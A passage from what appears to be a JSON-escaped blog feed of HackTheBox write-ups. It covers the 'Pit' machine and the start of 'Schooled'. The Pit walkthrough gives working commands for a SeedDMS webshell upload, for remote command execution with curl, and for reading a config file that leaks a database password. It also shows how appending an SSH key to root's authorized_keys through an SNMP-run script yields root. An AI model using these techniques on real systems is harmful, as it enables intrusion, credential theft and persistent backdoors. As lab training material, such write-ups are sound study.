SF:-8\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;meta\\x20name=\\\u0026#34;viewport\\\u0026#34;\\x20content=\\\u0026#34;width=de SF:vice-width,\\x20initial-scale=1\\.0\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;style\u0026gt;\\n\\tbody\\x SF:20{\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20margin:\\x200;\\n\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20font-family:\\x20\\\u0026#34;RedHatDi SF:splay\\\u0026#34;,\\x20\\\u0026#34;Open\\x20Sans\\\u0026#34;,\\x20Helvetica,\\x20Arial,\\x20sans-serif;\\n\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20font-size:\\x2012px;\\n\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20line-height:\\x201\\.6666666 SF:7;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20color:\\x20#333333;\\ SF:n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20background-color:\\x20# SF:f5f5f5;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20}\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20img\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20border:\\ SF:x200;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20vertical-align:\\ SF:x20middle;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20}\\n\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20h1\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20font-w SF:eight:\\x20300;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20}\\n\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20p\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20mar SF:gin:\\x200\\x200\\x2010p\u0026#34;)%r(HTTPOptions,E70,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20r SF:equest\\r\\nContent-Type:\\x20text/html;\\x20charset=utf8\\r\\nTransfer-Encod SF:ing:\\x20chunked\\r\\nX-DNS-Prefetch-Control:\\x20off\\r\\nReferrer-Policy:\\x SF:20no-referrer\\r\\nX-Content-Type-Options:\\x20nosniff\\r\\nCross-Origin-Res SF:ource-Policy:\\x20same-origin\\r\\n\\r\\n29\\r\\n\u0026lt;!DOCTYPE\\x20html\u0026gt;\\n\u0026lt;html\u0026gt;\\n\u0026lt; SF:head\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;title\u0026gt;\\r\\nb\\r\\nBad\\x20request\\r\\nd08\\r\\n\u0026lt;/title SF:\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;meta\\x20http-equiv=\\\u0026#34;Content-Type\\\u0026#34;\\x20content=\\\u0026#34;te SF:xt/html;\\x20charset=utf-8\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;meta\\x20name=\\\u0026#34;viewport\\ SF:\u0026#34;\\x20content=\\\u0026#34;width=device-width,\\x20initial-scale=1\\.0\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x SF:20\\x20\u0026lt;style\u0026gt;\\n\\tbody\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20margin:\\x200;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20fon SF:t-family:\\x20\\\u0026#34;RedHatDisplay\\\u0026#34;,\\x20\\\u0026#34;Open\\x20Sans\\\u0026#34;,\\x20Helvetica,\\x20A SF:rial,\\x20sans-serif;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20f SF:ont-size:\\x2012px;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20lin SF:e-height:\\x201\\.66666667;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20color:\\x20#333333;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0background-color:\\x20#f5f5f5;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20}\\n\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20img\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\\x20border:\\x200;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20vertical-align:\\x20middle;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20}\\n\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20h1\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20font-weight:\\x20300;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:}\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20p\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20margin:\\x200\\x200\\x2010p\u0026#34;); Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 240.41 seconds Web Server Port 9090 gobuster └─$ gobuster dir -u http://pit.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,js,php --no-error =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://pit.htb/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: php,txt,html,js [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /index.html (Status: 200) [Size: 4057] └─$ gobuster dir -u http://dms-pit.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,js,php --no-error -t 50 =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://dms-pit.htb/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: php,txt,html,js [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /conferences.html (Status: 403) [Size: 169] /conferences.txt (Status: 403) [Size: 169] /conferences (Status: 403) [Size: 169] /conferences.js (Status: 403) [Size: 169] /conference.txt (Status: 403) [Size: 169] /conference (Status: 403) [Size: 169] /conference.js (Status: 403) [Size: 169] /conference.html (Status: 403) [Size: 169] /conf.txt (Status: 403) [Size: 169] /conf.js (Status: 403) [Size: 169] /conf.html (Status: 403) [Size: 169] /conf (Status: 403) [Size: 169] /config.txt (Status: 403) [Size: 169] /config.html (Status: 403) [Size: 169] /config (Status: 403) [Size: 169] /config.js (Status: 403) [Size: 169] /Conferences (Status: 403) [Size: 169] /Conferences.txt (Status: 403) [Size: 169] /Conferences.html (Status: 403) [Size: 169] /Conferences.js (Status: 403) [Size: 169] /confused.js (Status: 403) [Size: 169] /confused.html (Status: 403) [Size: 169] /confused.txt (Status: 403) [Size: 169] /confused (Status: 403) [Size: 169] /configure (Status: 403) [Size: 169] /configure.html (Status: 403) [Size: 169] /configure.js (Status: 403) [Size: 169] /configure.txt (Status: 403) [Size: 169] \u0026lt;SNIP\u0026gt; Nothing much, so let\u0026rsquo;s check UDP ports └─$ sudo nmap -sU -F 10.10.10.241 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-04 20:25 GMT Nmap scan report for pit.htb (10.10.10.241) Host is up (0.18s latency). Not shown: 78 filtered udp ports (admin-prohibited) PORT STATE SERVICE 49/udp open|filtered tacacs 88/udp open|filtered kerberos-sec 111/udp open|filtered rpcbind 123/udp open|filtered ntp 137/udp open|filtered netbios-ns 138/udp open|filtered netbios-dgm 161/udp open snmp 427/udp open|filtered svrloc 1028/udp open|filtered ms-lsa 1433/udp open|filtered ms-sql-s 1434/udp open|filtered ms-sql-m 1645/udp open|filtered radius 2222/udp open|filtered msantipiracy 3283/udp open|filtered netassistant 4500/udp open|filtered nat-t-ike 5060/udp open|filtered sip 10000/udp open|filtered ndmp 31337/udp open|filtered BackOrifice 49154/udp open|filtered unknown 49181/udp open|filtered unknown 49185/udp open|filtered unknown 49190/udp open|filtered unknown Nmap done: 1 IP address (1 host up) scanned in 78.83 seconds snmpwalk └─$ snmpwalk -v1 -c public 10.10.10.241 . \u0026gt; snmpwalk \u0026lt;SNIP\u0026gt; NET-SNMP-EXTEND-MIB::nsExtendOutNumLines.\u0026#34;memory\u0026#34; = INTEGER: 3 NET-SNMP-EXTEND-MIB::nsExtendOutNumLines.\u0026#34;monitoring\u0026#34; = INTEGER: 27 NET-SNMP-EXTEND-MIB::nsExtendResult.\u0026#34;memory\u0026#34; = INTEGER: 0 NET-SNMP-EXTEND-MIB::nsExtendResult.\u0026#34;monitoring\u0026#34; = INTEGER: 0 NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;memory\u0026#34;.1 = STRING: total used free shared buff/cache available NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;memory\u0026#34;.2 = STRING: Mem: 4023500 299404 3443512 8764 280584 3487528 NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;memory\u0026#34;.3 = STRING: Swap: 1961980 0 1961980 NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.1 = STRING: Database status NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.2 = STRING: OK - Connection to database successful. NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.3 = STRING: System release info NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.4 = STRING: CentOS Linux release 8.3.2011 NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.5 = STRING: SELinux Settings NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.6 = STRING: user NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.7 = STRING: NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.8 = STRING: Labeling MLS/ MLS/ NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.9 = STRING: SELinux User Prefix MCS Level MCS Range SELinux Roles NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.10 = STRING: NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.11 = STRING: guest_u user s0 s0 guest_r NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.12 = STRING: root user s0 s0-s0:c0.c1023 staff_r sysadm_r system_r unconfined_r NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.13 = STRING: staff_u user s0 s0-s0:c0.c1023 staff_r sysadm_r unconfined_r NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.14 = STRING: sysadm_u user s0 s0-s0:c0.c1023 sysadm_r NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.15 = STRING: system_u user s0 s0-s0:c0.c1023 system_r unconfined_r NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.16 = STRING: unconfined_u user s0 s0-s0:c0.c1023 system_r unconfined_r NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.17 = STRING: user_u user s0 s0 user_r NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.18 = STRING: xguest_u user s0 s0 xguest_r NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.19 = STRING: login NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.20 = STRING: NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.21 = STRING: Login Name SELinux User MLS/MCS Range Service NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.22 = STRING: NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.23 = STRING: __default__ unconfined_u s0-s0:c0.c1023 * NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.24 = STRING: michelle user_u s0 * NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.25 = STRING: root unconfined_u s0-s0:c0.c1023 * NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.26 = STRING: System uptime NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.27 = STRING: 16:32:31 up 1:42, 0 users, load average: 0.08, 0.02, 0.01 We have an interesting seeddms inside /var/www/html \u0026lt;SNIP\u0026gt; UCD-SNMP-MIB::dskPath.1 = STRING: / UCD-SNMP-MIB::dskPath.2 = STRING: /var/www/html/seeddms51x/seeddms UCD-SNMP-MIB::dskDevice.1 = STRING: /dev/mapper/cl-root UCD-SNMP-MIB::dskDevice.2 = STRING: /dev/mapper/cl-seeddms \u0026lt;SNIP\u0026gt; http://dms-pit.htb/seeddms51x/seeddms/ Foothold/User Combination of michelle:michelle creds work If we open Upgrade Note, we can download Changelog It indicates that SeedDMS is version 5.1.15 We only have CVE-2019-12744 Which is fixed by .htaccess But Nginx does not use .htaccess files as Apache does. And we do have http://dms-pit.htb/seeddms51x/data/.htaccess file So we could potentially exploit it via CVE-2019-12744 We just need to find a way to upload files Upload a shell.php Check the id of the document and visit http://dms-pit.htb/seeddms51x/data/1048576/\u0026lt;ID\u0026gt;/1.php?cmd=id └─$ curl http://dms-pit.htb/seeddms51x/data/1048576/29/1.php?cmd=id uid=992(nginx) gid=988(nginx) groups=988(nginx) context=system_u:system_r:httpd_t:s0 Unfortunately, we can\u0026rsquo;t spawn a reverse shell So we have to enumerate the box this way We have a settings.xml in web directory └─$ curl http://dms-pit.htb/seeddms51x/data/1048576/31/1.php --data-urlencode \u0026#39;cmd=pwd\u0026#39; /var/www/html/seeddms51x/data/1048576/31 └─$ curl http://dms-pit.htb/seeddms51x/data/1048576/31/1.php --data-urlencode \u0026#39;cmd=ls ../../../\u0026#39; conf data pear seeddms www └─$ curl http://dms-pit.htb/seeddms51x/data/1048576/31/1.php --data-urlencode \u0026#39;cmd=ls ../../../conf/\u0026#39; settings.xml settings.xml.template stopwords.txt We have creds \u0026lt;SNIP\u0026gt; \u0026lt;database dbDriver=\u0026#34;mysql\u0026#34; dbHostname=\u0026#34;localhost\u0026#34; dbDatabase=\u0026#34;seeddms\u0026#34; dbUser=\u0026#34;seeddms\u0026#34; dbPass=\u0026#34;ied^ieY6xoquu\u0026#34; doNotCheckVersion=\u0026#34;false\u0026#34;\u0026gt; \u0026lt;/database\u0026gt; \u0026lt;!-- smtpServer: SMTP Server hostname - smtpPort: SMTP Server port - smtpSendFrom: Send from --\u0026gt; \u0026lt;SNIP\u0026gt; Unfortunately we can\u0026rsquo;t ssh But we can login to service on port 9090 There\u0026rsquo;s a terminal window we can access Root as michelle I can only list only michelle\u0026rsquo;s processes [michelle@pit /]$ ps auxww USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 1 0.0 0.3 245492 14244 ? Ss Nov04 0:15 /usr/lib/systemd/systemd --switched-root --system --deserialize 17 michelle 11362 0.0 0.0 27404 520 ? Ss 08:02 0:00 /usr/bin/ssh-agent michelle 11365 0.0 0.2 94020 9820 ? Ss 08:02 0:00 /usr/lib/systemd/systemd --user michelle 11369 0.0 0.1 314760 5152 ? S 08:02 0:00 (sd-pam) michelle 11375 0.2 0.6 494604 27104 ? Rl 08:02 0:03 cockpit-bridge michelle 11563 0.0 0.0 24100 3904 pts/0 Ss 08:03 0:00 /bin/bash michelle 12799 0.0 0.0 58696 4000 pts/0 R+ 08:26 0:00 ps auxww But we saw the list of processes via snmp \u0026lt;SNIP\u0026gt; NET-SNMP-EXTEND-MIB::nsExtendCommand.\u0026#34;monitoring\u0026#34; = STRING: /usr/bin/monitor \u0026lt;SNIP\u0026gt; The string indicates we could possibly perform rce https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp/snmp-rce https://mogwailabs.de/en/blog/2019/10/abusing-linux-snmp-for-rce/ The file itself can be executed as root And it\u0026rsquo;s a shell script [michelle@pit /]$ ls -lha /usr/bin/monitor -rwxr--r--. 1 root root 88 Apr 18 2020 /usr/bin/monitor [michelle@pit /]$ file /usr/bin/monitor /usr/bin/monitor: Bourne-Again shell script, ASCII text executable #!/bin/bash for script in /usr/local/monitoring/check*sh do /bin/bash $script done Let\u0026rsquo;s check /usr/local/monitoring It has + at the of the permissions getfacl shows that michelle can write and execute from the directory [michelle@pit /]$ ls -lhd /usr/local/monitoring drwxrwx---+ 2 root root 101 Nov 5 08:30 /usr/local/monitoring [michelle@pit /]$ getfacl /usr/local/monitoring/ getfacl: Removing leading \u0026#39;/\u0026#39; from absolute path names # file: usr/local/monitoring/ # owner: root # group: root user::rwx user:michelle:-wx group::rwx mask::rwx other::--- I\u0026rsquo;ll create a script which will write my ssh key to root\u0026rsquo;s authorized_keys And spawn it from snmp The output looks good And now we can get our flag [michelle@pit monitoring]$ echo \u0026#39;echo \u0026#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDo\u0026lt;SNIP\u0026gt; kali@kali\u0026#34; \u0026gt;\u0026gt; /root/.ssh/authorized_keys\u0026#39; \u0026gt; check_key.sh └─$ snmpwalk -v1 -c public 10.10.10.241 NET-SNMP-EXTEND-MIB::nsExtendObjects NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 2 NET-SNMP-EXTEND-MIB::nsExtendCommand.\u0026#34;memory\u0026#34; = STRING: /usr/bin/free NET-SNMP-EXTEND-MIB::nsExtendCommand.\u0026#34;monitoring\u0026#34; = STRING: /usr/bin/monitor NET-SNMP-EXTEND-MIB::nsExtendArgs.\u0026#34;memory\u0026#34; = STRING: NET-SNMP-EXTEND-MIB::nsExtendArgs.\u0026#34;monitoring\u0026#34; = STRING: NET-SNMP-EXTEND-MIB::nsExtendInput.\u0026#34;memory\u0026#34; = STRING: \u0026lt;SNIP\u0026gt; ","date":"November 2, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/pit/images/pit.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/pit/","summary":"Pit Enumeration nmap └─$ nmap -p- 10.10.10.241 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-04 19:04 GMT Host is up (3.4s latency). Not shown: 63975 filtered tcp ports (no-response), 1557 filtered tcp ports (host-unreach) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 9090/tcp open zeus-admin Nmap done: 1 IP address (1 host up) scanned in 1608.36 seconds └─$ nmap -p22,80,9090 -sC -sV 10.10.10.241 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.","tags":["HTB","udp","snmp","feroxbuster","snmpwalk","seeddms","cve-2019-12744","exploitdb","webshell","upload","selinux","cockpit","getfacl","facl"],"title":"[HTB] Machine: Pit"},{"categories":null,"contents":"Schooled Enumeration nmap └─$ nmap -Pn -p- 10.10.10.234 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-06 06:55 GMT Warning: 10.10.10.234 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.234 (10.10.10.234) Host is up (0.17s latency). Not shown: 59976 closed tcp ports (conn-refused), 5556 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 33060/tcp open mysqlx Nmap done: 1 IP address (1 host up) scanned in 399.16 seconds └─$ nmap -Pn -p22,80,33060 -sC -sV 10.10.10.234 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-06 08:15 GMT Nmap scan report for 10.10.10.234 (10.10.10.234) Host is up (0.21s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0) | ssh-hostkey: | 2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc (RSA) | 256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 (ECDSA) |_ 256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f (ED25519) 80/tcp open http Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15) |_http-title: Schooled - A new kind of educational institute |_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15 | http-methods: |_ Potentially risky methods: TRACE 33060/tcp open mysqlx? | fingerprint-strings: | DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: | Invalid message\u0026#34; | HY000 | LDAPBindReq: | *Parse error unserializing protobuf message\u0026#34; | HY000 | oracle-tns: | Invalid message-frame.\u0026#34; |_ HY000 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port33060-TCP:V=7.94%I=7%D=11/6%Time=6548A0B9%P=x86_64-pc-linux-gnu%r(N SF:ULL,9,\u0026#34;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\u0026#34;)%r(GenericLines,9,\u0026#34;\\x05\\0\\0\\0\\x0b\\ SF:x08\\x05\\x1a\\0\u0026#34;)%r(GetRequest,9,\u0026#34;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\u0026#34;)%r(HTTPOp SF:tions,9,\u0026#34;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\u0026#34;)%r(RTSPRequest,9,\u0026#34;\\x05\\0\\0\\0\\x0b SF:\\x08\\x05\\x1a\\0\u0026#34;)%r(RPCCheck,9,\u0026#34;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\u0026#34;)%r(DNSVers SF:ionBindReqTCP,9,\u0026#34;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\u0026#34;)%r(DNSStatusRequestTCP,2 SF:B,\u0026#34;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88\u0026#39;\\x1a\\x0fI SF:nvalid\\x20message\\\u0026#34;\\x05HY000\u0026#34;)%r(Help,9,\u0026#34;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\u0026#34;) SF:%r(SSLSessionReq,2B,\u0026#34;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01 SF:\\x10\\x88\u0026#39;\\x1a\\x0fInvalid\\x20message\\\u0026#34;\\x05HY000\u0026#34;)%r(TerminalServerCookie SF:,9,\u0026#34;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\u0026#34;)%r(TLSSessionReq,2B,\u0026#34;\\x05\\0\\0\\0\\x0b\\x SF:08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88\u0026#39;\\x1a\\x0fInvalid\\x20message\\\u0026#34; SF:\\x05HY000\u0026#34;)%r(Kerberos,9,\u0026#34;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\u0026#34;)%r(SMBProgNeg,9 SF:,\u0026#34;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\u0026#34;)%r(X11Probe,2B,\u0026#34;\\x05\\0\\0\\0\\x0b\\x08\\x05\\ SF:x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88\u0026#39;\\x1a\\x0fInvalid\\x20message\\\u0026#34;\\x05HY0 SF:00\u0026#34;)%r(FourOhFourRequest,9,\u0026#34;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\u0026#34;)%r(LPDString, SF:9,\u0026#34;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\u0026#34;)%r(LDAPSearchReq,2B,\u0026#34;\\x05\\0\\0\\0\\x0b\\x0 SF:8\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88\u0026#39;\\x1a\\x0fInvalid\\x20message\\\u0026#34;\\ SF:x05HY000\u0026#34;)%r(LDAPBindReq,46,\u0026#34;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\x009\\0\\0\\0\\x01\\ SF:x08\\x01\\x10\\x88\u0026#39;\\x1a\\*Parse\\x20error\\x20unserializing\\x20protobuf\\x20me SF:ssage\\\u0026#34;\\x05HY000\u0026#34;)%r(SIPOptions,9,\u0026#34;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\u0026#34;)%r(LAN SF:Desk-RC,9,\u0026#34;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\u0026#34;)%r(TerminalServer,9,\u0026#34;\\x05\\0\\0\\ SF:0\\x0b\\x08\\x05\\x1a\\0\u0026#34;)%r(NCP,9,\u0026#34;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\u0026#34;)%r(NotesRP SF:C,2B,\u0026#34;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88\u0026#39;\\x1a\\x SF:0fInvalid\\x20message\\\u0026#34;\\x05HY000\u0026#34;)%r(JavaRMI,9,\u0026#34;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x SF:1a\\0\u0026#34;)%r(WMSRequest,9,\u0026#34;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\u0026#34;)%r(oracle-tns,32,\u0026#34; SF:\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0%\\0\\0\\0\\x01\\x08\\x01\\x10\\x88\u0026#39;\\x1a\\x16Invalid SF:\\x20message-frame\\.\\\u0026#34;\\x05HY000\u0026#34;)%r(ms-sql-s,9,\u0026#34;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x SF:1a\\0\u0026#34;)%r(afp,2B,\u0026#34;\\x05\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10 SF:\\x88\u0026#39;\\x1a\\x0fInvalid\\x20message\\\u0026#34;\\x05HY000\u0026#34;); Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 42.56 seconds Web server gobuster └─$ gobuster dir -u http://10.10.10.234/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,js,php --no-error =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.234/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: txt,html,js,php [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.html (Status: 403) [Size: 199] /images (Status: 301) [Size: 235] [--\u0026gt; http://10.10.10.234/images/] /index.html (Status: 200) [Size: 20750] /contact.html (Status: 200) [Size: 11066] /about.html (Status: 200) [Size: 17784] /css (Status: 301) [Size: 232] [--\u0026gt; http://10.10.10.234/css/] /js (Status: 301) [Size: 231] [--\u0026gt; http://10.10.10.234/js/] /fonts (Status: 301) [Size: 234] [--\u0026gt; http://10.10.10.234/fonts/] /teachers.html (Status: 200) [Size: 15997] vhosts └─$ wfuzz -u http://schooled.htb/ -H \u0026#39;Host: FUZZ.schooled.htb\u0026#39; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hw 1555 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://schooled.htb/ Total requests: 19966 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000162: 200 1 L 5 W 84 Ch \u0026#34;moodle\u0026#34; 000009532: 400 10 L 45 W 347 Ch \u0026#34;#www\u0026#34; 000010581: 400 10 L 45 W 347 Ch \u0026#34;#mail\u0026#34; Total time: 0 Processed Requests: 19966 Filtered Requests: 19963 Requests/sec.: 0 moodle.schooled.htb I\u0026rsquo;ll register a user Foothold We can enroll to Maths course There 2 announcements One states: Students who do not set their MoodleNet profiles will be removed from the course before the course is due to start and I will be checking all students who are enrolled on this course So someone will be checking things 